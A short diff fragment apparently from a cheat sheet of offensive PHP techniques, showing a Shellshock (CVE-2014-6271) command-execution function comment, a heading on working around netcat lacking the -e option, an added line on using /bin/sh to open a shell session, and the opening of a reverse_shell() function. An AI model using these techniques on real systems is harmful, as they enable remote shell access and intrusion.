@@ -137,6 +137,7 @@ function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
 ?>
 ```
 ## 4. Deal with missing -e option in netcat
+Certain nc version does not provide -e option for us to open a shell session. Workaround by using `/bin/sh` as below:
 ```php
 <?php
 function reverse_shell() {
